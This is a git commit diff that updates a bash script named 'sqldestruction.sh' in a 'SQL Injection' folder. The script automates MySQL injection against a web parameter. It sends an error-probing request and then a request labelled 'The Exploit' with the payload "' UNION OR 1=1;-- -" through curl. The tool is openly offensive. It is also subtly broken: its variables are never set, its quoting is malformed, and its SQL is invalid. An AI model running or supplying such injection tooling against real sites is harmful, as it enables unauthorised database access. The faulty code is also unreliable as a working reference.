1e4948adfb1c9bbd4838dfd982cc94545b1712e8
H1sok4 <88634883+H1sok444@users.noreply.github.com>
2025-05-17 02:40:14 +0100

    Update sqldestruction.sh

--- SQL Injection/sqldestruction.sh
+++ SQL Injection/sqldestruction.sh
@@ -1,7 +1,11 @@
 #!/bin/bash
-# This is a script that is made to automate sql injections
+# This is a script that is made to automate mysql injections
 
 echo "Enter the host info (ip/domain)" 
 echo "Submit the the vulnerable/suspected parameter"
 
-curl $host/index.php?{$p}=' UNION OR 1=1;-- -
+# Triggering an error
+curl "$host/index.php?{$p}=' "' %'-- -"" | grep error
+
+# The Exploit
+curl "{$host}/index.php?{$p}=' UNION OR 1=1;-- -"
